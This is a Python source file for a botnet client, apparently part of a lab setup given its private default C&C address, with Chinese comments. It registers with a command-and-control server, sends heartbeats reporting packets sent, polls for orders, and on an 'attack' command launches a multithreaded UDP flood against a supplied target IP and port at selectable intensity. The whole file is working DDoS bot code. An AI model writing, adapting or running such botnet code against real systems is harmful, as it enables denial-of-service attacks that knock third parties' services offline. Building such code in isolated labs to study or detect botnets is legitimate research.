#!/usr/bin/env python3
"""
Bot Agent - 僵尸节点客户端
连接到C&C服务器并执行攻击指令
"""

import os
import sys
import time
import socket
import requests
import threading
from udp_attack import UDPAttacker

class BotAgent:
    def __init__(self, bot_id, c2_url):
        self.bot_id = bot_id
        self.c2_url = c2_url
        self.bot_ip = self.get_local_ip()
        self.status = "idle"
        self.attacker = None
        self.running = True
        
        print(f"[{self.bot_id}] Bot初始化")
        print(f"[{self.bot_id}] IP: {self.bot_ip}")
        print(f"[{self.bot_id}] C&C: {self.c2_url}")
    
    def get_local_ip(self):
        """获取本地IP地址"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def register(self):
        """向C&C服务器注册"""
        max_retries = 20
        retry_count = 0
        
        # 初始等待，让C2服务器完全启动
        print(f"[{self.bot_id}] 等待C2服务器启动...")
        time.sleep(10)
        
        while retry_count < max_retries:
            try:
                print(f"[{self.bot_id}] 尝试注册到 {self.c2_url}...")
                response = requests.post(
                    f"{self.c2_url}/api/register",
                    json={
                        "bot_id": self.bot_id,
                        "bot_ip": self.bot_ip
                    },
                    timeout=5
                )
                if response.status_code == 200:
                    print(f"[{self.bot_id}] ✓ 注册成功")
                    return True
                else:
                    print(f"[{self.bot_id}] 注册返回状态码: {response.status_code}")
            except requests.exceptions.ConnectionError as e:
                retry_count += 1
                print(f"[{self.bot_id}] 无法连接到C2服务器 ({retry_count}/{max_retries})")
                time.sleep(3)
            except Exception as e:
                retry_count += 1
                print(f"[{self.bot_id}] 注册失败 ({retry_count}/{max_retries}): {e}")
                time.sleep(3)
        
        print(f"[{self.bot_id}] ✗ 注册失败，退出")
        return False
    
    def send_heartbeat(self):
        """发送心跳和状态更新"""
        consecutive_failures = 0
        while self.running:
            try:
                data = {
                    "bot_id": self.bot_id,
                    "status": self.status
                }
                
                # 始终发送统计信息（如果有attacker实例）
                if self.attacker:
                    stats = self.attacker.get_stats()
                    data["packets_sent"] = stats["packets_sent"]
                    data["bytes_sent"] = stats["bytes_sent"]
                
                response = requests.post(
                    f"{self.c2_url}/api/heartbeat",
                    json=data,
                    timeout=3
                )
                
                if response.status_code == 200:
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
                    print(f"[{self.bot_id}] 心跳返回异常状态: {response.status_code}")
                    
            except Exception as e:
                consecutive_failures += 1
                if consecutive_failures % 5 == 0:  # 每5次失败打印一次
                    print(f"[{self.bot_id}] 心跳发送失败 (连续{consecutive_failures}次): {e}")
            
            time.sleep(3)  # 每3秒发送一次心跳
    
    def poll_commands(self):
        """轮询C&C获取指令"""
        while self.running:
            try:
                response = requests.get(
                    f"{self.c2_url}/api/command/{self.bot_id}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    command = response.json()
                    self.handle_command(command)
                
            except Exception as e:
                print(f"[{self.bot_id}] 获取指令失败: {e}")
            
            time.sleep(3)  # 每3秒轮询一次
    
    def handle_command(self, command):
        """处理C&C指令"""
        action = command.get("action")
        
        if action == "attack":
            if self.status != "attacking":
                print(f"[{self.bot_id}] 收到攻击指令")
                self.start_attack(command)
        
        elif action == "idle":
            if self.status == "attacking":
                print(f"[{self.bot_id}] 收到停止指令")
                self.stop_attack()
    
    def start_attack(self, params):
        """启动攻击"""
        target_ip = params.get("target_ip")
        target_port = params.get("target_port", 9999)
        attack_type = params.get("attack_type", "udp_flood")
        duration = params.get("duration", 60)
        intensity = params.get("intensity", "medium")
        
        # 根据强度设置线程数
        intensity_map = {
            "low": 5,
            "medium": 10,
            "high": 20
        }
        threads = intensity_map.get(intensity, 10)
        
        print(f"[{self.bot_id}] 开始攻击: {target_ip}:{target_port}")
        print(f"[{self.bot_id}] 类型: {attack_type}, 强度: {intensity}, 线程: {threads}")
        
        self.status = "attacking"
        
        # 创建攻击器
        self.attacker = UDPAttacker(
            target_ip=target_ip,
            target_port=target_port,
            num_threads=threads,
            duration=duration
        )
        
        # 在新线程中启动攻击
        attack_thread = threading.Thread(target=self._run_attack, daemon=True)
        attack_thread.start()
    
    def _run_attack(self):
        """执行攻击（在独立线程中）"""
        try:
            self.attacker.start()
        except Exception as e:
            print(f"[{self.bot_id}] 攻击异常: {e}")
        finally:
            self.status = "idle"
            print(f"[{self.bot_id}] 攻击结束")
    
    def stop_attack(self):
        """停止攻击"""
        if self.attacker:
            self.attacker.stop()
            self.status = "idle"
    
    def run(self):
        """运行Bot"""
        # 注册到C&C
        if not self.register():
            return
        
        # 启动心跳线程
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        
        # 启动指令轮询线程
        command_thread = threading.Thread(target=self.poll_commands, daemon=True)
        command_thread.start()
        
        print(f"[{self.bot_id}] Bot运行中，等待指令...")
        
        # 主线程保持运行
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n[{self.bot_id}] 收到停止信号")
            self.running = False
            if self.attacker:
                self.attacker.stop()

def main():
    bot_id = os.environ.get('BOT_ID', 'bot_unknown')
    c2_url = os.environ.get('C2_SERVER', 'http://10.10.10.2:5000')
    
    print("=" * 60)
    print(f"Bot Agent启动: {bot_id}")
    print("=" * 60)
    
    bot = BotAgent(bot_id, c2_url)
    bot.run()

if __name__ == '__main__':
    main()
